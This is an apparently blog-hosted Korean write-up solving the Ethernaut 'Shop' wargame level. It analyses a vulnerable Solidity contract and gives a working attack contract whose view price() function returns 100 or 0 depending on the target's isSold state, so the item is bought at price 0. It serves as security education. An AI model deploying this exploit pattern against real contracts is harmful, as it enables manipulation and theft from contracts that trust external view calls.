https://teberr.notion.site/Ethernaut-Shop-0dc6312b73b24d57a8805445219b94bf

![shop.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5ba2b80d-0d19-432d-b542-325bbbe7ba55/shop.png)

> 과연 주어져 있는 price(100)보다 싼 가격으로 상점에서 물건을 살 수 있을까요?

- shop은 Buyer(구매자)가 사용하는 컨트랙트 입니다.
- view 접근제어자의 제약을 기억해보세요!
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

# 코드 분석 및 공격 설계

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

문제 컨트랙트인 Shop 컨트랙트는 buy 함수가 핵심이다. 

1. buy를 호출한 주소는 price()함수를 가지고 있어야 한다.(즉 컨트랙트에서 호출해야함)
2. 호출한 컨트랙트의 price함수 리턴값이 100보다 크거나 같고 아직 물건이 팔리지 않았어야 한다.
3. isSold 상태 변수를 true로 변경한다.
4. price 값을 호출한 컨트랙트의 price함수 리턴값으로 변경한다.

문제 목적은 price를 100보다 작은 값으로 변경하고 isSold를 true로 만드는 것이다.

### View 접근제어자

Buyer 인터페이스의 price() 함수는 접근제어자가 view로 되어있다. 

view 접근제어자는 상태 변수를 읽을 수는 있지만 변경은 불가능한 함수에 붙는 접근제어자이다. 

### 공격 설계

문제의 목적인 isSold를 true로 만들기 위해서는 if 문의 조건인 호출자인 (msg.sender) 컨트랙트의 price 리턴값이 100보다 크거나같고 isSold가 false여야 한다.

초기의 isSold는 어차피 false이므로 내 컨트랙트의 price 함수의 리턴값이 100이상이면 된다.

조건문 내부로 들어오면 price 값을 재설정 해주는데 이 값은 다시 한번 호출자인(msg.sender) 컨트랙트의 price함수를 호출한다. 이 리턴 값은 100보다 작아야 한다.

따라서 다음과 같은 조건으로 설정하면 된다.

1. 문제 인스턴스인 buy()함수를 호출하는 공격 컨트랙트를 작성한다.
2. 공격 컨트랙트에는 view 접근제어자로 되어있는 price()함수가 존재해야 한다.
3. price()함수는 처음 호출되었을 때는 100이상의 값을, 두번째 호출되었을 때는 100보다 작은 값을 리턴해야한다.

이 때 한가지 알아둬야 하는 점은 view 접근제어자로 되어있기 때문에 내 공격컨트랙트의 상태 변수를 변경하여 첫번째 호출인지 두번째 호출인지를 알 수 없다는 점이다. 따라서 첫번째 호출인지 두번째 호출인지 구분할 상태변수가 필요한데 그 값은 바로 문제 인스턴스의 isSold 상태변수를 기준점으로 하면 된다.

public으로 선언된 상태변수는 솔리디티 내부에서 컴파일 되며 그 상태변수의 값을 리턴해주는 상태변수명()함수를 만들기 때문에 public으로 선언된 isSold 상태변수 또한 그 값을 리턴해주는 isSold() 함수를 가지고 있다.

이 함수를 호출하는 것은 상태변수를 변경하는 것이 아니기 때문에 view 접근제어자가 달려있는 price()함수에서도 가능하다. 따라서 이를 이용해 위의 조건을 만족하는 공격 컨트랙트를 작성하면 된다.

# 공격

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
interface IShop{
    function buy() external;
    function isSold()external view returns(bool);
}
contract ShopAttack{
    IShop target ;
    constructor(address _target){
        target=IShop(_target);
    }

    function attack()public {
        target.buy();
    }
    
    function price() public view returns (uint){ // view는 상태 변수를 읽을 수는 있으나 변경은 안함
        if (target.isSold()==true){
            return 0;
        }else{
            return 100;
        }
    }

}
```

공격 컨트랙트에서 공격을 진행하면 문제 인스턴스의 buy함수를 호출한다.

constructor를 통해 문제 인스턴스의 주소를 받는다.

buy함수에서는 공격컨트랙트의 price함수를 두번 호출하게 되는데 처음 호출할때의 isSold 상태변수는 false이므로 100을 리턴하고 두번째 호출할 때는 isSold의 상태변수의 값이 true이므로 0을 리턴하게 된다.

![문제 인스턴스 상태변수 공격 성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bd91c8aa-2835-4981-957d-1cb75067629f/%EB%AC%B8%EC%A0%9C_%EC%9D%B8%EC%8A%A4%ED%84%B4%EC%8A%A4_%EC%83%81%ED%83%9C%EB%B3%80%EC%88%98_%EA%B3%B5%EA%B2%A9_%EC%84%B1%EA%B3%B5.png)

```jsx
->(await contract.price()).toNumber()
0
-> await contract.isSold()
true
```

공격 컨트랙트를 deploy(배포)후 attack()함수를 실행하여 문제 인스턴스의 buy함수를 실행시켜 주면 isSold는 true로 price는 0으로 변경된다.

문제 목적을 달성하였으므로 제출하면 된다.
